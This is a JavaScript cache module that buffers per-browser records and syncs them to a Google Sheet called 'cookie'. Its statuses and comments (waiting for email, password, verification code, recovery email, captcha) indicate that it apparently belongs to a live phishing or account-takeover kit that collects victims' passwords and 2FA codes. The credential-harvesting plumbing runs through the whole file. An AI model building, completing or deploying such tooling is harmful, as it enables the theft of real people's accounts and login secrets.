import logger from './logger.js';

// Use globalThis so ALL route modules (engine, pooling-operator, update-process)
// share the same cache instance even in Next.js dev mode where webpack may
// create separate module scopes per route.
if (!globalThis.__cookieCache) globalThis.__cookieCache = new Map();
if (!globalThis.__pendingSync) globalThis.__pendingSync = new Map();
const cookieCache = globalThis.__cookieCache;
const pendingSync = globalThis.__pendingSync;
let syncRunning = false;
let syncTimer = null;

const ACTIVE_STATUSES = new Set([
    'WAITING', 'WAITINGEMAIL', 'WAITINGPASSWORD', 'WAITINGPASSWORDERROR',
    'WAITINGOPTIONS', 'WAITINGCODE', 'WAITINGRECOVERYEMAIL', 'WAITINGCAPTCHA',
    'PROCESSING'
]);

export function getCachedRow(browserId) {
    return cookieCache.get(browserId) || null;
}

export function setCachedRow(browserId, updates) {
    const existing = cookieCache.get(browserId) || {};
    const merged = { ...existing, ...updates };

    // Always store in cache so pooling-operator sees latest state immediately.
    // Terminal statuses (COMPLETED, FAILED) were previously evicted, causing the
    // template to stay stuck on a stale PROCESSING.
    cookieCache.set(browserId, merged);
    pendingSync.set(browserId, merged);
    startSyncIfNeeded();
}

export function populateCache(browserId, fullRow) {
    cookieCache.set(browserId, fullRow);
}

export function evictRow(browserId) {
    cookieCache.delete(browserId);
}

export function getCacheSize() {
    return cookieCache.size;
}

export function getPendingSyncSize() {
    return pendingSync.size;
}

export async function immediateFlush(browserId) {
    const rowData = pendingSync.get(browserId);
    if (!rowData) return;

    // Engine owns ALL status transitions. immediateFlush only writes user-submitted
    // data (email, password, verification fields, lastUserActivity) — NEVER status.
    // This prevents the pooling operator from overwriting PROCESSING/COMPLETED/FAILED
    // that the engine wrote to the sheet.
    const { status, ...dataOnly } = rowData;
    if (Object.keys(dataOnly).length === 0) {
        pendingSync.delete(browserId);
        return;
    }

    const { updateSheetRowApi } = await import('../app/api/googlesheets.js');
    try {
        await updateSheetRowApi('cookie', 'browserId', browserId, dataOnly);
        pendingSync.delete(browserId);
        logger.info(`[CookieCache] Immediate flush done for ${browserId} (wrote ${Object.keys(dataOnly).join(', ')})`);
    } catch (e) {
        logger.error(`[CookieCache] Immediate flush failed for ${browserId}: ${e.message}`);
    }
}

function startSyncIfNeeded() {
    if (syncRunning || pendingSync.size === 0) return;
    syncRunning = true;
    logger.info(`[CookieCache] Starting sync. ${pendingSync.size} dirty rows.`);
    syncTimer = setInterval(flushToSheets, 5000);
}

async function flushToSheets() {
    if (pendingSync.size === 0) {
        clearInterval(syncTimer);
        syncTimer = null;
        syncRunning = false;
        logger.info('[CookieCache] Sync stopped — no dirty rows.');
        return;
    }

    const { updateSheetRowApi } = await import('../app/api/googlesheets.js');

    for (const [browserId, rowData] of pendingSync) {
        try {
            // Engine owns all status transitions. Strip status from sync writes.
            const { status, ...dataOnly } = rowData;
            if (Object.keys(dataOnly).length > 0) {
                await updateSheetRowApi('cookie', 'browserId', browserId, dataOnly);
            }
            pendingSync.delete(browserId);
        } catch (e) {
            logger.error(`[CookieCache] Failed to sync ${browserId}: ${e.message}`);
        }
    }

    if (pendingSync.size === 0) {
        clearInterval(syncTimer);
        syncTimer = null;
        syncRunning = false;
        logger.info('[CookieCache] Sync stopped — all rows flushed.');
    }
}
